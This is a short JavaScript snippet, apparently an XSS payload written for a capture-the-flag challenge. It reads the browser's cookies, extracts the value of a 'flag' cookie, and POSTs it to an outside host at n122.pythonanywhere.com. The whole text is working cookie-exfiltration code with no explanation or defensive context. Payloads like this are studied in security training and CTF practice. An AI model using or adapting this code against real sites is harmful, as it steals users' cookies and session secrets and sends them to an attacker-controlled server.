document.cookie.split(" ").find(row => row.startsWith("flag=")) && fetch("https://n122.pythonanywhere.com/", {
    method: "POST",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    body: `flag=${encodeURIComponent(document.cookie.split("; ").find(row => row.startsWith("flag=")).split("=")[1])}`
}).catch(err => console.error("Error", err));
